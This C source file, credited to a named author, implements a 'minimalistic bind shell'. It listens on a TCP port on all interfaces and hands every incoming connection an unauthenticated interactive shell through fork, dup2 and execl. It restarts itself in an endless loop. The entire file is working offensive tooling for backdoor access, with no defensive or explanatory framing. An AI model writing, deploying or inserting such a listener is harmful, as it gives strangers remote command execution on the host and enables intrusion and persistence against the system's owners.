/*
 *
 * Minimalistic Bind Shell
 * Written by: Michael Coppola
 * URL: http://www.poppopret.org/
 *
 * ./bind 8000 /bin/msh
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

void bind_shell ( char **argv )
{
    pid_t pid;
    int sockfd, port, result;
    char *endptr;
    struct sockaddr_in sin;

    if ( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0 )
    {
        printf("Error creating socket.\n");
        return;
    }

    port = strtol(argv[1], &endptr, 0);
    if ( *endptr )
    {
        printf("Invalid port number.\n");
        exit(1);
    }

    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = htonl(INADDR_ANY);
    sin.sin_port = htons(port);

    printf("Bound to port %d, waiting for connection...\n", port);

    if ( bind(sockfd, (struct sockaddr *)&sin, sizeof(sin)) < 0 )
    {
        printf("Error binding to port.\n");
        return;
    }

    if ( listen(sockfd, 1) < 0 )
    {
        printf("Error listening for connections.\n");
        return;
    }

    while ( 1 )
    {
        if ( (result = accept(sockfd, NULL, 0)) < 0 )
        {
            printf("Error accepting new connection.\n");
            return;
        }

        printf("Received connection, dropping shell.\n");

        if ( fork() == 0 )
        {
            dup2(result, 2);
            dup2(result, 1);
            dup2(result, 0);

            execl(argv[2], argv[2], NULL);

            return;
        }
        else
            close(result);
    }
}

int main ( int argc, char **argv )
{
    while ( 1 )
    {
        bind_shell(argv);
        sleep(1);
    }
}
